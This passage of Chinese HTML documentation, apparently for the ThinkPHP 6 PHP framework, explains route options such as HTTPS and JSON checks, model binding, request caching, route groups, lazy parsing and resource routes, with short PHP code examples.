<p>&#x5982;&#x679C;&#x9700;&#x8981;&#x7ED9;&#x5B50;&#x57DF;&#x540D;&#x5B9A;&#x4E49;&#x6279;&#x91CF;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF0C;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;<code>domain</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#x3002;</p>
</blockquote>
<h4 id="https&#x68C0;&#x6D4B;"><code>HTTPS</code>&#x68C0;&#x6D4B;</h4>
<p>&#x652F;&#x6301;&#x68C0;&#x6D4B;&#x5F53;&#x524D;&#x662F;&#x5426;<code>HTTPS</code>&#x8BBF;&#x95EE;</p>
<pre><code>// &#x5FC5;&#x987B;&#x4F7F;&#x7528;HTTPS&#x8BBF;&#x95EE;
Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;https();
</code></pre><h4 id="ajaxpjaxjson&#x68C0;&#x6D4B;"><code>AJAX</code>/<code>PJAX</code>/<code>JSON</code>&#x68C0;&#x6D4B;</h4>
<p>&#x53EF;&#x4EE5;&#x68C0;&#x6D4B;&#x5F53;&#x524D;&#x662F;&#x5426;&#x4E3A;<code>AJAX</code>/<code>PJAX</code>/<code>JSON</code>&#x8BF7;&#x6C42;&#x3002;</p>
<pre><code>// &#x5FC5;&#x987B;&#x662F;JSON&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;
Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;json();
</code></pre><h4 id="&#x8BF7;&#x6C42;&#x53D8;&#x91CF;&#x68C0;&#x6D4B;">&#x8BF7;&#x6C42;&#x53D8;&#x91CF;&#x68C0;&#x6D4B;</h4>
<p>&#x53EF;&#x4EE5;&#x5728;&#x5339;&#x914D;&#x8DEF;&#x7531;&#x5730;&#x5740;&#x4E4B;&#x5916;&#xFF0C;&#x989D;&#x5916;&#x68C0;&#x67E5;&#x8BF7;&#x6C42;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x5339;&#x914D;&#xFF0C;&#x53EA;&#x6709;&#x6307;&#x5B9A;&#x7684;&#x8BF7;&#x6C42;&#x53D8;&#x91CF;&#x4E5F;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x624D;&#x80FD;&#x5339;&#x914D;&#x8BE5;&#x8DEF;&#x7531;&#x3002;</p>
<pre><code>// &#x68C0;&#x67E5;type&#x53D8;&#x91CF;
Route::post(&apos;new/:id&apos;, &apos;News/save&apos;)
    -&gt;filter(&apos;type&apos;, 1);   

// &#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x8BF7;&#x6C42;&#x53D8;&#x91CF;
Route::post(&apos;new/:id&apos;, &apos;News/save&apos;)
    -&gt;filter([ &apos;type&apos; =&gt; 1,&apos;status&apos;=&gt; 1 ]);
</code></pre><h4 id="&#x95ED;&#x5305;&#x68C0;&#x6D4B;">&#x95ED;&#x5305;&#x68C0;&#x6D4B;</h4>
<p><code>V6.0.12+</code>&#x5F00;&#x59CB;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x95ED;&#x5305;&#x6765;&#x68C0;&#x6D4B;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#x6216;&#x5206;&#x7EC4;&#x662F;&#x5426;&#x5339;&#x914D;</p>
<pre><code>// &#x95ED;&#x5305;&#x68C0;&#x6D4B;
Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;match(function(Rule $rule,Request $request) {
        // &#x5982;&#x679C;&#x8FD4;&#x56DE;false &#x5219;&#x89C6;&#x4E3A;&#x4E0D;&#x5339;&#x914D;
        return false;
    });
</code></pre><h4 id="&#x8FFD;&#x52A0;&#x989D;&#x5916;&#x53C2;&#x6570;">&#x8FFD;&#x52A0;&#x989D;&#x5916;&#x53C2;&#x6570;</h4>
<p>&#x53EF;&#x4EE5;&#x5728;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x7684;&#x65F6;&#x5019;&#x9690;&#x5F0F;&#x8FFD;&#x52A0;&#x989D;&#x5916;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x5728;URL&#x5730;&#x5740;&#x4E2D;&#x3002;</p>
<pre><code>Route::get(&apos;blog/:id&apos;, &apos;Blog/read&apos;)
    -&gt;append([&apos;app_id&apos; =&gt; 1, &apos;status&apos; =&gt; 1]);
</code></pre><p>&#x5728;&#x8DEF;&#x7531;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x540C;&#x65F6;&#x4F20;&#x5165;<code>app_id</code>&#x548C;<code>status</code>&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x3002;</p>
<h4 id="&#x8DEF;&#x7531;&#x7ED1;&#x5B9A;&#x6A21;&#x578B;">&#x8DEF;&#x7531;&#x7ED1;&#x5B9A;&#x6A21;&#x578B;</h4>
<p>&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x548C;&#x5206;&#x7EC4;&#x652F;&#x6301;&#x7ED1;&#x5B9A;&#x6A21;&#x578B;&#x6570;&#x636E;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;hello/:id&apos;, &apos;index/hello&apos;)
    -&gt;model(&apos;id&apos;, &apos;\app\index\model\User&apos;);
</code></pre><p>&#x4F1A;&#x81EA;&#x52A8;&#x7ED9;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#x7ED1;&#x5B9A; <code>id</code>&#x4E3A; &#x5F53;&#x524D;&#x8DEF;&#x7531;&#x53D8;&#x91CF;&#x503C;&#x7684;<code>User</code>&#x6A21;&#x578B;&#x6570;&#x636E;&#x3002;</p>
<p>&#x5982;&#x679C;&#x4F60;&#x7684;&#x6A21;&#x578B;&#x7ED1;&#x5B9A;&#x4F7F;&#x7528;&#x7684;&#x662F;<code>id</code>&#x4F5C;&#x4E3A;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x7684;&#x8BDD;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x7B80;&#x5316;&#x6210;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x5F0F;</p>
<pre><code>Route::get(&apos;hello/:id&apos;, &apos;index/hello&apos;)
    -&gt;model(&apos;\app\index\model\User&apos;);
</code></pre><p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x67E5;&#x8BE2;&#x5230;&#x6A21;&#x578B;&#x6570;&#x636E;&#xFF0C;&#x5219;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x5E0C;&#x671B;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>Route::rule(&apos;hello/:id&apos;, &apos;index/hello&apos;)
    -&gt;model(&apos;id&apos;, &apos;\app\index\model\User&apos;, false);
</code></pre><p>&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x6A21;&#x578B;&#x6570;&#x636E;&#x7684;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::rule(&apos;hello/:name/:id&apos;, &apos;index/hello&apos;)
    -&gt;model(&apos;id&amp;name&apos;, &apos;\app\index\model\User&apos;);
</code></pre><p>&#x8868;&#x793A;&#x67E5;&#x8BE2;<code>id</code>&#x548C;<code>name</code>&#x7684;&#x503C;&#x7B49;&#x4E8E;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#x53D8;&#x91CF;&#x7684;&#x6A21;&#x578B;&#x6570;&#x636E;&#x3002;</p>
<p>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x95ED;&#x5305;&#x6765;&#x81EA;&#x5B9A;&#x4E49;&#x8FD4;&#x56DE;&#x9700;&#x8981;&#x7684;&#x6A21;&#x578B;&#x5BF9;&#x8C61;</p>
<pre><code>Route::rule(&apos;hello/:id&apos;, &apos;index/hello&apos;)
    -&gt;model(function ($id) {
        $model = new \app\index\model\User;
        return $model-&gt;where(&apos;id&apos;, $id)-&gt;find();
    });
</code></pre><p>&#x95ED;&#x5305;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x5C31;&#x662F;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;URL&#x53D8;&#x91CF;&#x4FE1;&#x606F;&#x3002;</p>
<blockquote>
<p>&#x7ED1;&#x5B9A;&#x7684;&#x6A21;&#x578B;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x63A7;&#x5236;&#x5668;&#x7684;&#x67B6;&#x6784;&#x65B9;&#x6CD5;&#x6216;&#x8005;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x4E2D;&#x81EA;&#x52A8;&#x6CE8;&#x5165;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x8BF7;&#x6C42;&#x7AE0;&#x8282;&#x7684;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;&#x3002;</p>
</blockquote>
<h4 id="&#x8BF7;&#x6C42;&#x7F13;&#x5B58;">&#x8BF7;&#x6C42;&#x7F13;&#x5B58;</h4>
<p>&#x53EF;&#x4EE5;&#x5BF9;&#x5F53;&#x524D;&#x7684;&#x8DEF;&#x7531;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x8BF7;&#x6C42;&#x7F13;&#x5B58;&#x5904;&#x7406;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;new/:name$&apos;, &apos;News/read&apos;)
    -&gt;cache(3600);
</code></pre><p>&#x8868;&#x793A;&#x5BF9;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#x8BF7;&#x6C42;&#x7F13;&#x5B58;<code>3600</code>&#x79D2;&#xFF0C;&#x66F4;&#x591A;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x8BF7;&#x6C42;&#x7F13;&#x5B58;&#x4E00;&#x8282;&#x3002;</p>
<h4 id="&#x52A8;&#x6001;&#x53C2;&#x6570;">&#x52A8;&#x6001;&#x53C2;&#x6570;</h4>
<p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x989D;&#x5916;&#x81EA;&#x5B9A;&#x4E49;&#x4E00;&#x4E9B;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x5F0F;&#xFF1A;</p>
<pre><code>Route::get(&apos;new/:name$&apos;, &apos;News/read&apos;)
    -&gt;option(&apos;rule&apos;,&apos;admin&apos;);
</code></pre><p>&#x6216;&#x8005;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x65B9;&#x6CD5;</p>
<pre><code>Route::get(&apos;new/:name$&apos;, &apos;News/read&apos;)
    -&gt;rule(&apos;admin&apos;);
</code></pre><p>&#x5728;&#x540E;&#x7EED;&#x7684;&#x8DEF;&#x7531;&#x884C;&#x4E3A;&#x540E;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x8BE5;&#x8DEF;&#x7531;&#x7684;<code>rule</code>&#x53C2;&#x6570;&#x6765;&#x8FDB;&#x884C;&#x6743;&#x9650;&#x68C0;&#x67E5;&#x3002;</p>
<h4 id="&#x8DEF;&#x7531;&#x5206;&#x7EC4;">&#x8DEF;&#x7531;&#x5206;&#x7EC4;</h4>
<p>&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x529F;&#x80FD;&#x5141;&#x8BB8;&#x628A;&#x76F8;&#x540C;&#x524D;&#x7F00;&#x7684;&#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#x5408;&#x5E76;&#x5206;&#x7EC4;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x7B80;&#x5316;&#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#xFF0C;&#x5E76;&#x4E14;&#x63D0;&#x9AD8;&#x8DEF;&#x7531;&#x5339;&#x914D;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x4E0D;&#x5FC5;&#x6BCF;&#x6B21;&#x90FD;&#x53BB;&#x904D;&#x5386;&#x5B8C;&#x6574;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF08;&#x5C24;&#x5176;&#x662F;&#x5F00;&#x542F;&#x4E86;&#x8DEF;&#x7531;&#x5EF6;&#x8FDF;&#x89E3;&#x6790;&#x540E;&#x6027;&#x80FD;&#x66F4;&#x4F73;&#xFF09;&#x3002;</p>
<p>&#x4F7F;&#x7528;<code>Route</code>&#x7C7B;&#x7684;<code>group</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x6CE8;&#x518C;&#xFF0C;&#x7ED9;&#x5206;&#x7EC4;&#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#x4E00;&#x4E9B;&#x516C;&#x7528;&#x7684;&#x8DEF;&#x7531;&#x8BBE;&#x7F6E;&#x53C2;&#x6570;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::group(&apos;blog&apos;, function () {
    Route::rule(&apos;:id&apos;, &apos;blog/read&apos;);
    Route::rule(&apos;:name&apos;, &apos;blog/read&apos;);
})-&gt;ext(&apos;html&apos;)-&gt;pattern([&apos;id&apos; =&gt; &apos;\d+&apos;, &apos;name&apos; =&gt; &apos;\w+&apos;]);
</code></pre><p>&#x5206;&#x7EC4;&#x8DEF;&#x7531;&#x652F;&#x6301;&#x6240;&#x6709;&#x7684;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#xFF0C;&#x5177;&#x4F53;&#x53C2;&#x6570;&#x7684;&#x7528;&#x6CD5;&#x8BF7;&#x53C2;&#x8003;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#x7AE0;&#x8282;&#x5185;&#x5BB9;&#x3002;</p>
<p>&#x5982;&#x679C;&#x4EC5;&#x4EC5;&#x662F;&#x7528;&#x4E8E;&#x5BF9;&#x4E00;&#x4E9B;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x8BBE;&#x7F6E;&#x4E00;&#x4E9B;&#x516C;&#x5171;&#x7684;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#xFF08;&#x4E5F;&#x79F0;&#x4E4B;&#x4E3A;&#x865A;&#x62DF;&#x5206;&#x7EC4;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>Route::group(function () {
    Route::rule(&apos;blog/:id&apos;, &apos;blog/read&apos;);
    Route::rule(&apos;blog/:name&apos;, &apos;blog/read&apos;);
})-&gt;ext(&apos;html&apos;)-&gt;pattern([&apos;id&apos; =&gt; &apos;\d+&apos;, &apos;name&apos; =&gt; &apos;\w+&apos;]);
</code></pre><p>&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x652F;&#x6301;&#x5D4C;&#x5957;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::group(function () {
    Route::group(&apos;blog&apos;, function () {
        Route::rule(&apos;:id&apos;, &apos;blog/read&apos;);
        Route::rule(&apos;:name&apos;, &apos;blog/read&apos;);
    });
})-&gt;ext(&apos;html&apos;)-&gt;pattern([&apos;id&apos; =&gt; &apos;\d+&apos;, &apos;name&apos; =&gt; &apos;\w+&apos;]);
</code></pre><blockquote>
<p>&#x5982;&#x679C;&#x4F7F;&#x7528;&#x4E86;&#x5D4C;&#x5957;&#x5206;&#x7EC4;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5B50;&#x5206;&#x7EC4;&#x4F1A;&#x7EE7;&#x627F;&#x7236;&#x5206;&#x7EC4;&#x7684;&#x53C2;&#x6570;&#x548C;&#x53D8;&#x91CF;&#x89C4;&#x5219;&#xFF0C;&#x800C;&#x6700;&#x7EC8;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x91CC;&#x9762;&#x5B9A;&#x4E49;&#x7684;&#x53C2;&#x6570;&#x548C;&#x53D8;&#x91CF;&#x89C4;&#x5219;&#x4E3A;&#x6700;&#x4F18;&#x5148;&#x3002;</p>
</blockquote>
<p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>prefix</code>&#x65B9;&#x6CD5;&#x7B80;&#x5316;&#x76F8;&#x540C;&#x8DEF;&#x7531;&#x5730;&#x5740;&#x7684;&#x5B9A;&#x4E49;&#xFF0C;&#x4F8B;&#x5982;&#x4E0B;&#x9762;&#x7684;&#x5B9A;&#x4E49;</p>
<pre><code>Route::group(&apos;blog&apos;, function () {
    Route::get(&apos;:id&apos;, &apos;blog/read&apos;);
    Route::post(&apos;:id&apos;, &apos;blog/update&apos;);
    Route::delete(&apos;:id&apos;, &apos;blog/delete&apos;);
})-&gt;ext(&apos;html&apos;)-&gt;pattern([&apos;id&apos; =&gt; &apos;\d+&apos;]);
</code></pre><p>&#x53EF;&#x4EE5;&#x7B80;&#x5316;&#x4E3A;</p>
<pre><code>Route::group(&apos;blog&apos;, function () {
    Route::get(&apos;:id&apos;, &apos;read&apos;);
    Route::post(&apos;:id&apos;, &apos;update&apos;);
    Route::delete(&apos;:id&apos;, &apos;delete&apos;);
})-&gt;prefix(&apos;blog/&apos;)-&gt;ext(&apos;html&apos;)-&gt;pattern([&apos;id&apos; =&gt; &apos;\d+&apos;]);
</code></pre><h4 id="&#x8DEF;&#x7531;&#x5B8C;&#x5168;&#x5339;&#x914D;">&#x8DEF;&#x7531;&#x5B8C;&#x5168;&#x5339;&#x914D;</h4>
<p>&#x5982;&#x679C;&#x5E0C;&#x671B;&#x67D0;&#x4E2A;&#x5206;&#x7EC4;&#x4E0B;&#x9762;&#x7684;&#x8DEF;&#x7531;&#x90FD;&#x91C7;&#x7528;&#x5B8C;&#x5168;&#x5339;&#x914D;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>Route::group(&apos;blog&apos;, function () {
    Route::get(&apos;:id&apos;, &apos;read&apos;);
    Route::post(&apos;:id&apos;, &apos;update&apos;);
    Route::delete(&apos;:id&apos;, &apos;delete&apos;);
})-&gt;completeMatch()-&gt;prefix(&apos;blog/&apos;)-&gt;ext(&apos;html&apos;)-&gt;pattern([&apos;id&apos; =&gt; &apos;\d+&apos;]);
</code></pre><h4 id="&#x5EF6;&#x8FDF;&#x8DEF;&#x7531;&#x89E3;&#x6790;">&#x5EF6;&#x8FDF;&#x8DEF;&#x7531;&#x89E3;&#x6790;</h4>
<p>&#x652F;&#x6301;&#x5EF6;&#x8FDF;&#x8DEF;&#x7531;&#x89E3;&#x6790;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x4F60;&#x5B9A;&#x4E49;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF08;&#x4E3B;&#x8981;&#x662F;&#x5206;&#x7EC4;&#x8DEF;&#x7531;&#x548C;&#x57DF;&#x540D;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF09;&#x5728;&#x52A0;&#x8F7D;&#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x5019;&#x5E76;&#x6CA1;&#x6709;&#x5B9E;&#x9645;&#x6CE8;&#x518C;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x5339;&#x914D;&#x5230;&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x6216;&#x8005;&#x57DF;&#x540D;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x624D;&#x4F1A;&#x5B9E;&#x9645;&#x8FDB;&#x884C;&#x6CE8;&#x518C;&#x548C;&#x89E3;&#x6790;&#xFF0C;&#x5927;&#x5927;&#x63D0;&#x9AD8;&#x4E86;&#x8DEF;&#x7531;&#x6CE8;&#x518C;&#x548C;&#x89E3;&#x6790;&#x7684;&#x6027;&#x80FD;&#x3002;</p>
<p>&#x9ED8;&#x8BA4;&#x662F;&#x5173;&#x95ED;&#x5EF6;&#x8FDF;&#x8DEF;&#x7531;&#x89E3;&#x6790;&#x7684;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x8DEF;&#x7531;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;&#xFF1A;</p>
<pre><code>// &#x5F00;&#x542F;&#x8DEF;&#x7531;&#x5EF6;&#x8FDF;&#x89E3;&#x6790;
&apos;url_lazy_route&apos;         =&gt; true,
</code></pre><p>&#x5F00;&#x542F;&#x5EF6;&#x8FDF;&#x8DEF;&#x7531;&#x89E3;&#x6790;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x751F;&#x6210;&#x8DEF;&#x7531;&#x53CD;&#x89E3;URL&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x884C;&#x6307;&#x4EE4;</p>
<pre><code>php think optimize:route
</code></pre><p>&#x6765;&#x751F;&#x6210;&#x8DEF;&#x7531;&#x7F13;&#x5B58;&#x89E3;&#x6790;&#x3002;</p>
<blockquote>
<p>&#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x6216;&#x8005;&#x57DF;&#x540D;&#x8DEF;&#x7531;&#x6765;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x624D;&#x80FD;&#x53D1;&#x6325;&#x5EF6;&#x8FDF;&#x89E3;&#x6790;&#x7684;&#x4F18;&#x52BF;&#x3002;</p>
</blockquote>
<p>&#x4E00;&#x65E6;&#x5F00;&#x542F;&#x8DEF;&#x7531;&#x7684;&#x5EF6;&#x8FDF;&#x89E3;&#x6790;&#xFF0C;&#x5C06;&#x4F1A;&#x5BF9;&#x5B9A;&#x4E49;&#x7684;&#x57DF;&#x540D;&#x8DEF;&#x7531;&#x548C;&#x5206;&#x7EC4;&#x8DEF;&#x7531;&#x8FDB;&#x884C;&#x5EF6;&#x8FDF;&#x89E3;&#x6790;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x53EA;&#x6709;&#x5B9E;&#x9645;&#x5339;&#x914D;&#x5230;&#x8BE5;&#x57DF;&#x540D;&#x6216;&#x8005;&#x5206;&#x7EC4;&#x540E;&#x624D;&#x4F1A;&#x8FDB;&#x884C;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x7684;&#x6CE8;&#x518C;&#xFF0C;&#x907F;&#x514D;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x6CE8;&#x518C;&#x548C;&#x89E3;&#x6790;&#x5F00;&#x9500;&#x3002;</p>
<h4 id="&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x5408;&#x5E76;&#x89E3;&#x6790;">&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x5408;&#x5E76;&#x89E3;&#x6790;</h4>
<p>&#x540C;&#x4E00;&#x4E2A;&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x4E0B;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x652F;&#x6301;&#x5408;&#x5E76;&#x89E3;&#x6790;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x904D;&#x5386;&#x8BE5;&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF0C;&#x53EF;&#x4EE5;&#x5927;&#x5927;&#x63D0;&#x5347;&#x8DEF;&#x7531;&#x89E3;&#x6790;&#x7684;&#x6027;&#x80FD;&#x3002;</p>
<p>&#x5BF9;&#x67D0;&#x4E2A;&#x5206;&#x7EC4;&#x5355;&#x72EC;&#x5F00;&#x542F;&#x5408;&#x5E76;&#x89C4;&#x5219;&#x89E3;&#x6790;&#x7684;&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>Route::group(&apos;user&apos;, function () {
    Route::rule(&apos;hello/:name&apos;,&apos;hello&apos;);
    Route::rule(&apos;think/:name&apos;,&apos;think&apos;);
})-&gt;mergeRuleRegex();
</code></pre><p>&#x8FD9;&#x6837;&#x8BE5;&#x5206;&#x7EC4;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x65E0;&#x8BBA;&#x5B9A;&#x4E49;&#x591A;&#x5C11;&#x4E2A;&#x90FD;&#x53EA;&#x9700;&#x8981;&#x5339;&#x914D;&#x68C0;&#x67E5;&#x4E00;&#x6B21;&#x5373;&#x53EF;&#xFF08;&#x5B9E;&#x9645;&#x4E0A;&#x53EA;&#x4F1A;&#x5408;&#x5E76;&#x68C0;&#x67E5;&#x7B26;&#x5408;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF09;&#x3002;</p>
<blockquote>
<p><code>mergeRuleRegex</code>&#x65B9;&#x6CD5;&#x53EA;&#x80FD;&#x7528;&#x4E8E;&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x6216;&#x8005;&#x57DF;&#x540D;&#x8DEF;&#x7531;&#xFF08;&#x57DF;&#x540D;&#x8DEF;&#x7531;&#x5176;&#x5B9E;&#x662F;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x5206;&#x7EC4;&#xFF09;&#x3002;</p>
</blockquote>
<p>&#x6216;&#x8005;&#x5728;&#x8DEF;&#x7531;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;&#x5F00;&#x542F;&#x5168;&#x5C40;&#x5408;&#x5E76;&#x89C4;&#x5219;&#xFF08;&#x5BF9;&#x6240;&#x6709;&#x5206;&#x7EC4;&#x6709;&#x6548;&#xFF09;</p>
<pre><code>// &#x5F00;&#x542F;&#x8DEF;&#x7531;&#x5408;&#x5E76;&#x89E3;&#x6790;
&apos;route_rule_merge&apos;    =&gt; true,
</code></pre><h4 id="&#x4F20;&#x5165;&#x989D;&#x5916;&#x53C2;&#x6570;">&#x4F20;&#x5165;&#x989D;&#x5916;&#x53C2;&#x6570;</h4>
<p>&#x53EF;&#x4EE5;&#x7EDF;&#x4E00;&#x7ED9;&#x5206;&#x7EC4;&#x8DEF;&#x7531;&#x4F20;&#x5165;&#x989D;&#x5916;&#x7684;&#x53C2;&#x6570;</p>
<pre><code>Route::group(&apos;blog&apos;, [
    &apos;:id&apos;   =&gt; &apos;Blog/read&apos;,
    &apos;:name&apos; =&gt; &apos;Blog/read&apos;,
])-&gt;ext(&apos;html&apos;)
-&gt;pattern([&apos;id&apos; =&gt; &apos;\d+&apos;])
-&gt;append([&apos;group_id&apos; =&gt; 1]);
</code></pre><p>&#x4E0A;&#x9762;&#x7684;&#x5206;&#x7EC4;&#x8DEF;&#x7531;&#x7EDF;&#x4E00;&#x4F20;&#x5165;&#x4E86;<code>group_id</code>&#x53C2;&#x6570;&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>Request</code>&#x7C7B;&#x7684;<code>param</code>&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x3002;</p>
<h4 id="&#x6307;&#x5B9A;&#x5206;&#x7EC4;&#x8C03;&#x5EA6;">&#x6307;&#x5B9A;&#x5206;&#x7EC4;&#x8C03;&#x5EA6;</h4>
<p><code>V6.0.8+</code>&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;&#x53EF;&#x4EE5;&#x7ED9;&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x5355;&#x72EC;&#x6307;&#x5B9A;&#x8C03;&#x5EA6;&#x7C7B;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::group(&apos;blog&apos;, [
    &apos;:id&apos;   =&gt; &apos;Blog/read&apos;,
    &apos;:name&apos; =&gt; &apos;Blog/read&apos;,
])-&gt;dispatcher(GroupDispatcher::class);
</code></pre><h4 id="&#x8D44;&#x6E90;&#x8DEF;&#x7531;">&#x8D44;&#x6E90;&#x8DEF;&#x7531;</h4>
<pre><code class="lang-http">php think make:controller Blog
</code></pre>
<p><a href="https://imgse.com/i/ppF81OS" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF81OS.png" alt="ppF81OS.png"></a></p>
<pre><code class="lang-php">Route::resource(<span class="hljs-string">&apos;blog&apos;</span>,<span class="hljs-string">&apos;Blog&apos;</span>);
</code></pre>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&#x5217;&#x8868;&#x9875;123&apos;</span>;
    }
</code></pre>
<p><a href="https://imgse.com/i/ppF8wlV" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF8wlV.png" alt="ppF8wlV.png"></a></p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span><span class="hljs-params">($id)</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&#x5217;&#x8868;&#x9875;&apos;</span>.$id;
    }
</code></pre>
